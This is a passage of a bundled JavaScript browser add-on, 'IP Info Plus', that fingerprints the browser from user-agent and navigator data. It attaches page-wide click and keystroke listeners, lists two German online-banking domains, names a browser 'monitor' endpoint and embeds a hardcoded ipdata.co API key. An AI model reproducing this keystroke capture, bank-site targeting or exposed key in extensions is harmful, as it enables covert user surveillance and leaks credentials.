            else if ((bnOffset = nvua.indexOf('freebsd')) !== -1 || (bnOffset = nvua.indexOf('FreeBSD')) !== -1 || (bnOffset = nvua.indexOf('FREEBSD')) !== -1) {
                this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
            }
        }
        else if (nvua.indexOf('macintosh') !== -1 || nvua.indexOf('Macintosh') !== -1) {
            this.PlatformName = 'Macintosh';
            this.PlatformWindowManager = 'Macintosh';
            this.DeviceName = 'Macintosh Desktop';
            this.DeviceType = 'Desktop';
            if ((bnOffset = nvua.indexOf('intel mac')) !== -1 || (bnOffset = nvua.indexOf('Intel Mac')) !== -1 || (bnOffset = nvua.indexOf('INTEL MAC')) !== -1) {
                this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
            }
        }
        else if (nvua.indexOf('mobile') !== -1 || nvua.indexOf('Mobile') !== -1 || nvua.indexOf('MOBILE') !== -1) {
            this.DeviceType = 'Mobile';
            if (nvua.indexOf('linux') !== -1 || nvua.indexOf('Linux') !== -1 || nvua.indexOf('LINUX') !== -1) {
                this.PlatformWindowManager = 'Linux';
            }
            if ((bnOffset = nvua.indexOf('android')) !== -1 || (bnOffset = nvua.indexOf('Android')) !== -1 || (bnOffset = nvua.indexOf('ANDROID')) !== -1) {
                this.DeviceName = 'Android Mobile';
                this.PlatformName = this.retrievePlatformNameFull(nvua, bnOffset);
            }
        }
        return this.PlatformName, this.PlatformWindowManager, this.retrieveArchitecture(nvua);
    }
    retrievePlatformNameFull(nvua, bnOffset) {
        let offset = '';
        let data = nvua.substr(bnOffset).toString();
        if ((offset = data.indexOf(";")) !== -1) {
            data = data.toString().substring(0, offset);
        }
        else if ((offset = data.indexOf(")")) !== -1) {
            data = data.toString().substring(0, offset);
        }
        else if ((offset = data.indexOf(" ")) !== -1) {
            data = data.toString().substring(0, offset);
        }
        return data.replace(/[(/)]/g, ' ');
    }
    retrieveArchitecture(nvua) {
        if (nvua.indexOf('x64') !== -1 || nvua.indexOf('WOW64') !== -1 || nvua.indexOf('Win64') !== -1 || nvua.indexOf('amd64') !== -1 || nvua.indexOf('x86_64') !== -1) {
            this.BrowserArchitecture = '64 bit';
            this.PlatformArchitecture = '64 bit';
        }
        else if (nvua.indexOf('i586') !== -1 || nvua.indexOf('i686') !== -1 || nvua.indexOf('x86') !== -1 || nvua.indexOf('i386') !== -1) {
            this.BrowserArchitecture = '32 bit';
            this.PlatformArchitecture = '32 bit';
        }
    }
    retrieveBrowserInfo(nv) {
        let bnOffset = '';
        let nvua = nv.userAgent;
        this.UserAgent = nv.userAgent ? nv.userAgent : 'Unavailable';
        this.BrowserAppName = nv.appName ? nv.appName : 'Unavailable';
        this.BrowserAppCodeName = nv.appCodeName ? nv.appCodeName : 'Unavailable';
        this.BrowserAppVersion = nv.appVersion ? nv.appVersion : 'Unavailable';
        this.BrowserBuildID = nv.buildID ? nv.buildID : 'Unavailable';
        this.BrowserDoNotTrack = nv.doNotTrack ? nv.doNotTrack : 'Unavailable';
        this.BrowserCookieEnabled = nv.cookieEnabled ? nv.cookieEnabled : 'Unavailable';
        this.BrowserLanguage = nv.language ? nv.language : 'Unavailable';
        this.BrowserLanguageAll = nv.languages ? nv.languages : 'Unavailable';
        this.BrowserEngine = nv.product ? nv.product : 'Unavailable';
        this.BrowserEngineVersion = nv.productSub ? nv.productSub : 'Unavailable';
        this.DeviceHardwareConcurrency = nv.hardwareConcurrency ? nv.hardwareConcurrency : 'Unavailable';
        this.DeviceMemory = nv.DeviceMemory ? nv.DeviceMemory : 'Unavailable';
        this.BrowserVendor = nv.vendor ? nv.vendor : (this.BrowserName === 'Firefox' ? 'Mozilla Foundation' : 'Unavailable');
        if ((bnOffset = nvua.indexOf('firefox')) !== -1 || (bnOffset = nvua.indexOf('Firefox')) !== -1 || (bnOffset = nvua.indexOf('FIREFOX')) !== -1) {
            this.BrowserName = 'Firefox';
            this.BrowserNameFull = this.retrieveBrowserNameFull(nvua, bnOffset);
            this.BrowserVersion = this.retrieveBrowserVersion(this.BrowserName, this.BrowserNameFull);
            this.BrowserVersionFull = this.retrieveBrowserVersionFull(this.BrowserName, this.BrowserNameFull);
        }
        else if ((bnOffset = nvua.indexOf('opr')) !== -1 || (bnOffset = nvua.indexOf('Opr')) !== -1 || (bnOffset = nvua.indexOf('OPR')) !== -1) {
            this.BrowserName = 'Opera';
            this.BrowserNameFull = this.retrieveBrowserNameFull(nvua, bnOffset);
            this.BrowserVersion = this.retrieveBrowserVersion('OPR', this.BrowserNameFull);
            this.BrowserVersionFull = this.retrieveBrowserVersionFull('OPR', this.BrowserNameFull);
        }
        else if ((bnOffset = nvua.indexOf('opera')) !== -1 || (bnOffset = nvua.indexOf('Opera')) !== -1 || (bnOffset = nvua.indexOf('OPERA')) !== -1) {
            this.BrowserName = 'Opera';
            this.BrowserNameFull = this.retrieveBrowserNameFull(nvua, bnOffset);
            this.BrowserVersion = this.retrieveBrowserVersion(this.BrowserName, this.BrowserNameFull);
            this.BrowserVersionFull = this.retrieveBrowserVersionFull(this.BrowserName, this.BrowserNameFull);
        }
        else if ((bnOffset = nvua.indexOf('chromium')) !== -1 || (bnOffset = nvua.indexOf('Chromium')) !== -1 || (bnOffset = nvua.indexOf('CHROMIUM')) !== -1) {
            this.BrowserName = 'Chromium';
            this.BrowserNameFull = this.retrieveBrowserNameFull(nvua, bnOffset);
            this.BrowserVersion = this.retrieveBrowserVersion(this.BrowserName, this.BrowserNameFull);
            this.BrowserVersionFull = this.retrieveBrowserVersionFull(this.BrowserName, this.BrowserNameFull);
        }
        else if ((bnOffset = nvua.indexOf('chrome')) !== -1 || (bnOffset = nvua.indexOf('Chrome')) !== -1 || (bnOffset = nvua.indexOf('CHROME')) !== -1) {
            this.BrowserName = 'Chrome';
            this.BrowserNameFull = this.retrieveBrowserNameFull(nvua, bnOffset);
            this.BrowserVersion = this.retrieveBrowserVersion(this.BrowserName, this.BrowserNameFull);
            this.BrowserVersionFull = this.retrieveBrowserVersionFull(this.BrowserName, this.BrowserNameFull);
        }
        else if ((bnOffset = nvua.indexOf('edge')) !== -1 || (bnOffset = nvua.indexOf('Edge')) !== -1 || (bnOffset = nvua.indexOf('EDGE')) !== -1) {
            this.BrowserName = 'Edge';
            this.BrowserNameFull = this.retrieveBrowserNameFull(nvua, bnOffset);
            this.BrowserVersion = this.retrieveBrowserVersion(this.BrowserName, this.BrowserNameFull);
            this.BrowserVersionFull = this.retrieveBrowserVersionFull(this.BrowserName, this.BrowserNameFull);
        }
        else if ((bnOffset = nvua.indexOf('safari')) !== -1 || (bnOffset = nvua.indexOf('Safari')) !== -1 || (bnOffset = nvua.indexOf('SAFARI')) !== -1) {
            this.BrowserName = 'Safari';
            this.BrowserNameFull = this.retrieveBrowserNameFull(nvua, bnOffset);
            this.BrowserVersion = this.retrieveBrowserVersion(this.BrowserName, this.BrowserNameFull);
            this.BrowserVersionFull = this.retrieveBrowserVersionFull(this.BrowserName, this.BrowserNameFull);
        }
        return this;
    }
    browserStatus(navigator) {
        return this.BrowserStatus = navigator.onLine ? 'online' : 'offline';
    }
    retrieveBrowserNameFull(nvua, bnOffset) {
        let offset = '';
        let data = nvua.substr(bnOffset).toString();
        if ((offset = data.indexOf(";")) !== -1) {
            data = data.toString().substring(0, offset);
        }
        if ((offset = data.indexOf(")")) !== -1) {
            data = data.toString().substring(0, offset);
        }
        if ((offset = data.indexOf(" ")) !== -1) {
            data = data.toString().substring(0, offset);
        }
        return data.replace(/[(/)]/g, ' ');
    }
    retrieveBrowserVersion(BrowserName, BrowserNameFull) {
        return BrowserNameFull.substr(BrowserName.length + 1, (BrowserNameFull.search('\\.') - (BrowserName.length + 1)));
    }
    retrieveBrowserVersionFull(BrowserName, BrowserNameFull) {
        return BrowserNameFull.substr(BrowserName.length + 1);
    }
    mouseEvent() {
        window.onload = function () {
            /*capture all click event*/
            document.addEventListener('click', function (e) {
                //--alert('clicked');
                console.log(e);
            });
            /*capture all contextmenu event*/
            document.addEventListener('contextmenu', function (e) {
                //--alert('clicked');
                console.log(e);
            });
            /*capture all keyup event*/
            document.addEventListener('keyup', function (e) {
                //--alert('clicked');
                console.log(e);
            });
            /*capture all keydown event*/
            document.addEventListener('keydown', function (e) {
                //--alert('clicked');
                console.log(e);
            });
            /*capture all change event*/
            document.addEventListener('change', function (e) {
                console.log(e);
            });
        };
    }
}


/***/ }),

/***/ "./assets/ts/db.ts":
/*!*************************!*\
  !*** ./assets/ts/db.ts ***!
  \*************************/
/*! exports provided: today, app */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "today", function() { return today; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "app", function() { return app; });
/*
* IP Info Plus
* Developer: Mr Abir Ahamed
* Website: https://www.mishusoft.com
* Official Link: https://download.mishusoft.com/addons/ipinfoplus/
* */
const today = new Date();
const app = {
    "about": {
        "name": "IPInfoPlus",
        "guid": "addon.firefox@developer.mishuoft.com",
        "short_name": "IPInfo Plus",
        "name_spaced": "IP Info Plus",
        "total_users": "200",
        "version": "1.4.2",
    },
    "extras": {
        "OnlineBanks": ["meine.deutsche-bank.de", "www.dkb.de"]
    },
    "website": {
        "home": "https://www.mishusoft.com/",
        "IpInfoTEST": "https://api.ipdata.co/?api-key=test",
        "IpInfo": "https://api.ipdata.co/?api-key=2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180",
        "temporary": {
            "home": "http://localhost/",
            "monitorURL": "http://localhost/monitor/browser/",
        },
        "publish": {
            "home": "https://www.mishusoft.com/",
            "monitorURL": "https://www.mishusoft.com/monitor/browser/",
        }
    },
    "baseURI": document.URL,
    "body": {
        "content": {
            "images": {
                "map-pin-marker-circle.png": "data:image/png;base64,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